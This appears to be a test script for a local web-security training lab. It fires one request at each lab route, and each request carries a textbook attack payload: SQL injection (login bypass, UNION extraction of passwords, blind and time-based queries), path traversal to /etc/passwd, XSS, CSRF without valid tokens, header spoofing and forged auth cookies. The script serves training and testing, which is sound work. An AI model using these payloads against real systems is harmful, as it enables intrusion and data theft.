import worker from "./index.js";
import crypto from "node:crypto";
const base = "http://localhost:8787";
async function t(name, path, opts) {
  const r = await worker.fetch(new Request(base + path, opts || {}), {});
  const h = r.headers.get("x-lab-solved");
  console.log(`${name.padEnd(18)} status=${r.status} solved=${h || "-"}`);
}
await t("sqli-2 login", "/lab/sqli-2", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=administrator'--&password=x" });
await t("sqli-1 hidden", "/lab/sqli-1?category=Gifts' OR 1=1 --");
await t("sqli-3 union", "/lab/sqli-3?category=Gifts' UNION SELECT username FROM users--");
await t("sqli-4 union2", "/lab/sqli-4?category=Gifts' UNION SELECT username,password FROM users--");
await t("sqli-5 bool", "/lab/sqli-5?trackingId=x' AND (SELECT 'a' FROM users WHERE username='administrator')='a");
await t("sqli-6 time", "/lab/sqli-6?trackingId=x' || (SELECT CASE WHEN (SELECT username FROM users WHERE username='administrator')='administrator' THEN pg_sleep(5) ELSE pg_sleep(0) END)--");
await t("pt-1 trav", "/lab/pt-1?filename=../../../etc/passwd");
await t("pt-2 abs", "/lab/pt-2?filename=/etc/passwd");
await t("pt-3 nested", "/lab/pt-3?filename=....//....//etc/passwd");
await t("pt-4 dblenc", "/lab/pt-4?filename=%252e%252e%252fetc%252fpasswd");
await t("pt-5 base", "/lab/pt-5?filename=/var/www/images/../../../etc/passwd");
await t("pt-6 null", "/lab/pt-6?filename=../../../etc/passwd%00.png");
await t("xss-1", "/lab/xss-1?q=<script>alert(1)</script>");
await t("xss-2 stored", "/lab/xss-2", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "author=a&comment=<script>alert(1)</script>" });
await t("xss-4 attr", "/lab/xss-4?q=\" onfocus=alert(1) autofocus=\"");
await t("xss-5 img", "/lab/xss-5", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "author=a&comment=<img src=x onerror=alert(1)>" });
await t("xss-6 enc", "/lab/xss-6?q=\" onclick=alert(1)");
await t("xss-7 js", "/lab/xss-7?q=</script><script>alert(1)</script>");
await t("csrf-1 noToken", "/lab/csrf-1/email", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "email=a@b.com" });
await t("csrf-2 fakeToken", "/lab/csrf-2/email", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "email=a@b.com&csrf=bogus" });
await t("csrf-3 get", "/lab/csrf-3?email=a@b.com");
await t("csrf-4 noReferer", "/lab/csrf-4/email", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "email=a@b.com" });
await t("csrf-5 json", "/lab/csrf-5/email", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"email":"a@b.com"}' });
await t("auth-1 bad user", "/lab/auth-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=nouser&password=x" });
await t("auth-1 bad pass", "/lab/auth-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=carlos&password=x" });
await t("auth-2 xff", "/lab/auth-2", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "X-Forwarded-For": "1.2.3.4" }, body: "username=carlos&password=montoya" });
await t("auth-3 lock", "/lab/auth-3", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=carlos&password=montoya" });
await t("auth-4 cookie", "/lab/auth-4", { headers: { Cookie: "userId=2" } });
await t("auth-5 forged", "/lab/auth-5", { headers: { Cookie: "stayLoggedIn=" + btoa("carlos:" + await md5("montoya")) } });
await t("auth-6 direct", "/lab/auth-6/my-account");
await t("ac-1 admin", "/lab/ac-1/admin");
await t("ac-2 robots", "/lab/ac-2/administrator-panel");
await t("ac-3 uid", "/lab/ac-3?uid=2");
await t("ac-4 api", "/lab/ac-4/api/change-email", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"uid":2,"email":"h@x.com"}' });
await t("ac-5 POST", "/lab/ac-5/admin", { method: "POST" });
await t("ac-6 ref", "/lab/ac-6/admin", { headers: { Referer: "http://x/admin" } });
await t("cj-1 page", "/lab/cj-1");
await t("unknown", "/lab/nope");

async function md5(s) {
  return crypto.createHash("md5").update(s).digest("hex");
}
function btoa(s) { return Buffer.from(s).toString("base64"); }